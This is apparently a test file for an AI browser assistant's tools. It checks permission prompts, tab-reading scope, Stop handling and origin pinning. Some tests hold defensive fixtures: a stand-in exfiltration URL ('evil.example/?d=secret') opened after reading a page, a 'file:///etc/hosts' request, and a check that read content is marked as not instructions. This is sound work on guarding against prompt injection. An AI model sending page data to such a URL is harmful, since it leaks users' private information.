import { test } from "node:test";
import assert from "node:assert/strict";
import { Asks } from "../runtime/src/asks.ts";
import * as Tools from "../runtime/src/browserTools.ts";

const CHAT = "0b9e6c1e-2f4a-4c55-9d7e-1a2b3c4d5e6f";

function tab(id, url, over = {}) {
  return { type: "tab", id, url, title: id, group: null, split: null, ...over };
}

function world({ split = false, grouped = false } = {}) {
  const chat = tab("chat", `ardia://ai/${CHAT}`, { active: true, split: split ? "s1" : null, group: grouped ? "g1" : null });
  const beside = tab("news", "https://news.example/a", { split: split ? "s1" : null });
  const other = tab("bank", "https://bank.example/home");
  const inGroup = tab("doc", "https://docs.example/x", { group: "g1" });
  const items = grouped ? [{ type: "group", id: "g1", items: [chat, inGroup] }, beside, other] : [chat, beside, other];
  const calls = [];
  let nextTab = 1;
  const host = {
    calls,
    workspace: async () => ({ windows: [{ id: "w1", spaces: [{ profile: "p", tabs: items }] }] }),
    browse: async (tabId, argv) => (calls.push(["browse", tabId, ...argv]), { ok: true, text: `content of ${tabId}` }),
    openTab: async (url) => {
      const id = `new${nextTab++}`;
      calls.push(["open", url]);
      items.push(tab(id, url));
      return { tabId: id };
    },
    closeTab: async (id) => void calls.push(["close", id]),
    activateTab: async (id) => void calls.push(["activate", id]),
    groupWithChat: async (chatTabId, ids) => (calls.push(["group", chatTabId, ...ids]), { group: "g1" }),
    splitToGroup: async (chatTabId) => (calls.push(["splitToGroup", chatTabId]), { group: "g2" }),
    banner: async (id, text) => void calls.push(["banner", id, text]),
  };
  return host;
}

function liveTurn(stopped = false) {
  const controller = new AbortController();
  if (stopped) controller.abort(new Error("stopped"));
  return { ledger: { stop: () => controller.abort(new Error("stopped")) }, turn: { runId: "r1", signal: controller.signal } };
}

function context(host, { answer = null, stopped = false, grants = [] } = {}) {
  const asks = new Asks(1000);
  const { ledger, turn } = liveTurn(stopped);
  const opened = new Map();
  const read = new Set();
  const uses = [];
  let saved = grants;
  if (answer) asks.onChange((chatId) => {
    for (const a of asks.pending(chatId)) setTimeout(() => asks.answer(chatId, a.id, answer), 0);
  });
  return {
    asks,
    uses,
    read,
    ledger,
    ctx: {
      turn,
      host,
      asks,
      memory: { opened: () => opened, tagged: () => new Set(), noteOpened: (_c, id, origin) => opened.set(id, origin), hasReadPages: (c) => read.has(c), noteReadPages: (c) => read.add(c) },
      grants: { list: () => saved, save: (g) => (saved = g) },
      onUse: (u) => uses.push(u),
    },
    savedGrants: () => saved,
  };
}

test("reading the tab beside the chat in its split doesn't ask", async () => {
  const host = world({ split: true });
  const { ctx, uses } = context(host);
  const r = await Tools.readTab(ctx, CHAT, "news");
  assert.match(r.content, /content of news/);
  assert.match(r.content, /not instructions/);
  assert.deepEqual(uses.map((u) => u.outcome), ["allowed"]);
});

test("reading a tab outside the chat asks; Deny stops it before the page is touched", async () => {
  const host = world();
  const { ctx } = context(host, { answer: "deny" });
  await assert.rejects(Tools.readTab(ctx, CHAT, "bank"), (e) => e.code === "denied");
  assert.equal(host.calls.filter((c) => c[0] === "browse").length, 0);
});

test("Always for this site is remembered for that origin only", async () => {
  const host = world();
  const c = context(host, { answer: "always" });
  await Tools.readTab(c.ctx, CHAT, "bank");
  assert.deepEqual(c.savedGrants(), [{ origin: "https://bank.example", kind: "read" }]);
});

test("clicking always asks and shows the banner only while acting", async () => {
  const host = world({ grouped: true });
  const { ctx, uses } = context(host, { answer: "allow" });
  await Tools.click(ctx, CHAT, "doc", "@e3");
  assert.deepEqual(uses.map((u) => u.outcome), ["asked-allowed"]);
  const banner = host.calls.filter((c) => c[0] === "banner");
  assert.deepEqual(banner, [["banner", "doc", "Assistant is using this tab"], ["banner", "doc", null]]);
});

test("an unknown tab (or one in a private window, which the host never lists) is refused", async () => {
  const host = world();
  const { ctx } = context(host, { answer: "allow" });
  await assert.rejects(Tools.readTab(ctx, CHAT, "incognito-tab"), (e) => e.code === "refused");
});

test("the chat can't read itself or another chat", async () => {
  const host = world();
  const { ctx } = context(host, { answer: "allow" });
  await assert.rejects(Tools.readTab(ctx, CHAT, "chat"), (e) => e.code === "refused");
});

test("opening only takes http(s), and lands in the chat's group when asked to", async () => {
  const host = world({ grouped: true });
  const { ctx } = context(host);
  await assert.rejects(Tools.openTab(ctx, CHAT, "file:///etc/hosts", "chat", false), (e) => e.code === "refused");
  const r = await Tools.openTab(ctx, CHAT, "https://example.com", "chat", false);
  assert.equal(r.inChatGroup, true);
  assert.deepEqual(host.calls.slice(-2), [["open", "https://example.com"], ["group", "chat", "new1"]]);
});

test("a tab the agent opened is readable without asking", async () => {
  const host = world();
  const { ctx, uses } = context(host);
  const r = await Tools.openTab(ctx, CHAT, "https://example.com", "none", false);
  await Tools.readTab(ctx, CHAT, r.tab);
  assert.deepEqual(uses.map((u) => u.outcome), ["allowed", "allowed"]);
});

test("in a split, adding to the chat's group says to convert the split first", async () => {
  const host = world({ split: true });
  const { ctx } = context(host);
  await assert.rejects(Tools.addToChatGroup(ctx, CHAT, ["news"]), (e) => e.code === "in_split");
  const r = await Tools.splitToGroup(ctx, CHAT);
  assert.deepEqual(r.tabs, ["chat", "news"]);
});

test("once the person presses Stop, every tool refuses", async () => {
  const host = world({ split: true });
  const { ctx } = context(host, { stopped: true });
  await assert.rejects(Tools.readTab(ctx, CHAT, "news"), (e) => e.code === "stopped");
  await assert.rejects(Tools.openTab(ctx, CHAT, "https://example.com", "chat", false), (e) => e.code === "stopped");
});

test("an unanswered ask times out as Deny", async () => {
  const host = world();
  const c = context(host);
  const asks = new Asks(10);
  c.ctx.asks = asks;
  await assert.rejects(Tools.readTab(c.ctx, CHAT, "bank"), (e) => e.code === "denied");
});

test("once a chat has read a page, opening any address asks first and shows it", async () => {
  const host = world({ split: true });
  const c = context(host, { answer: "deny" });
  await Tools.readTab(c.ctx, CHAT, "news");
  await assert.rejects(Tools.openTab(c.ctx, CHAT, "https://evil.example/?d=secret", "chat", false), (e) => e.code === "denied");
  assert.equal(host.calls.filter((x) => x[0] === "open").length, 0);
});

test("an opened tab stays readable without asking only while it's on the site it was opened at", async () => {
  const host = world();
  const c = context(host, { answer: "deny" });
  const r = await Tools.openTab(c.ctx, CHAT, "https://example.com", "none", false);
  const ws = await host.workspace();
  const opened = ws.windows[0].spaces[0].tabs.find((t) => t.id === r.tab);
  opened.url = "https://mail.example/inbox";
  await assert.rejects(Tools.readTab(c.ctx, CHAT, r.tab), (e) => e.code === "denied");
});

test("a page that changes site while an ask waits isn't acted on", async () => {
  const host = world({ grouped: true });
  const c = context(host);
  c.asks.onChange((chatId) => {
    for (const a of c.asks.pending(chatId))
      setTimeout(async () => {
        const ws = await host.workspace();
        const doc = ws.windows[0].spaces[0].tabs[0].items.find((t) => t.id === "doc");
        doc.url = "https://other.example/";
        c.asks.answer(chatId, a.id, "allow");
      }, 0);
  });
  await assert.rejects(Tools.click(c.ctx, CHAT, "doc", "@e1"), (e) => e.code === "page_changed");
  assert.equal(host.calls.filter((x) => x[0] === "browse").length, 0);
});

test("Always on a close or regroup ask grants nothing", async () => {
  const host = world();
  const c = context(host, { answer: "always" });
  await Tools.closeTab(c.ctx, CHAT, "bank");
  assert.deepEqual(c.savedGrants(), []);
});

test("Stop pressed while a form is being filled keeps the submit from happening", async () => {
  const host = world({ grouped: true });
  const c = context(host, { answer: "allow" });
  const browse = host.browse;
  host.browse = async (tabId, argv) => {
    const result = await browse(tabId, argv);
    if (argv[0] === "fill") c.ledger.stop(CHAT);
    return result;
  };
  await assert.rejects(Tools.type(c.ctx, CHAT, "doc", "@e2", "hello", true), (e) => e.code === "stopped");
  const actions = host.calls.filter((x) => x[0] === "browse").map((x) => x[2]);
  assert.deepEqual(actions, ["fill"], "Enter is never pressed after Stop");
  assert.deepEqual(host.calls.filter((x) => x[0] === "banner").at(-1), ["banner", "doc", null], "the banner is cleared");
});


function deferredHost(host) {
  const gates = [];
  const browse = host.browse;
  host.browse = (tabId, argv, signal) => new Promise((resolve, reject) => {
    gates.push(() => browse(tabId, argv).then(resolve, reject));
    signal?.addEventListener("abort", () => reject(new Error("aborted")), { once: true });
  });
  return { release: async () => { while (gates.length) await gates.shift()(); } };
}

const { TurnLedger, providerTurnKey } = await import("../runtime/src/turnLedger.ts");

async function turnFor(ledger, run, ordinal, messageId, toolUseId, tool) {
  ledger.allow(CHAT, messageId);
  ledger.launched({ threadId: CHAT, runId: run, providerTurn: providerTurnKey("pt", ordinal), session: "s", messageId });
  ledger.noteToolItem({ runId: run, nativeId: toolUseId, name: `mcp__t3-code__${tool}` });
  const found = await ledger.attribute(CHAT, { toolUseId, tool }, 50);
  assert.ok(found.ok, `${run} is live`);
  return found.turn;
}

test("Stop during a type-with-submit, a new turn starts, then the old fill's reply arrives successfully: no Enter, and the new turn's own tools work", async () => {
  const host = world({ grouped: true });
  const c = context(host, { answer: "allow" });
  const ledger = new TurnLedger();
  const oldTurn = await turnFor(ledger, "run-1", 1, "m-1", "toolu_type", "ardia_type");
  const browse = host.browse;
  let replyToFill = null;
  host.browse = (tabId, argv) => (argv[0] === "fill" ? new Promise((resolve) => (replyToFill = () => resolve(browse(tabId, argv)))) : browse(tabId, argv));
  const typing = Tools.type({ ...c.ctx, turn: oldTurn }, CHAT, "doc", "@e2", "hello", true);
  while (!replyToFill) await new Promise((r) => setTimeout(r, 1));
  ledger.stop(CHAT);
  const newTurn = await turnFor(ledger, "run-2", 2, "m-2", "toolu_click", "ardia_click");
  replyToFill();
  await assert.rejects(typing, (e) => e.code === "stopped");
  await Tools.click({ ...c.ctx, turn: newTurn }, CHAT, "doc", "@e9");
  const actions = host.calls.filter((x) => x[0] === "browse").map((x) => [x[2], x[3]]);
  assert.deepEqual(actions, [["fill", "@e2"], ["click", "@e9"]], "the old turn's Enter never reaches the page; the new turn's click does");
});

test("a click chain from a stopped turn can't take its next step after a new message starts another turn", async () => {
  const host = world({ grouped: true });
  const c = context(host, { answer: "allow" });
  await Tools.click(c.ctx, CHAT, "doc", "@e1");
  c.ledger.stop(CHAT);
  await assert.rejects(Tools.click(c.ctx, CHAT, "doc", "@e2"), (e) => e.code === "stopped");
  assert.deepEqual(host.calls.filter((x) => x[0] === "browse").map((x) => x[3]), ["@e1"], "only the click before Stop happened");
  assert.deepEqual(host.calls.filter((x) => x[0] === "banner").at(-1), ["banner", "doc", null], "the banner is cleared");
});

test("a tab that opened but couldn't join the chat's group is reported, with its id, instead of failing the call", async () => {
  const host = world({ grouped: true });
  const c = context(host);
  host.groupWithChat = async () => Promise.reject(new Error("The group didn't stay."));
  const r = await Tools.openTab(c.ctx, CHAT, "https://example.com", "chat", false);
  assert.equal(r.tab, "new1");
  assert.equal(r.inChatGroup, false);
  assert.equal(r.group, null);
  assert.match(r.note, /opened but couldn't join this chat's group \(The group didn't stay\.\)/);
  const stopped = world({ grouped: true });
  const s = context(stopped);
  stopped.groupWithChat = async () => (s.ledger.stop(), Promise.reject(new Error("aborted")));
  await assert.rejects(Tools.openTab(s.ctx, CHAT, "https://example.com", "chat", false), (e) => e.code === "stopped" && /already opened tab new1/.test(e.message));
});
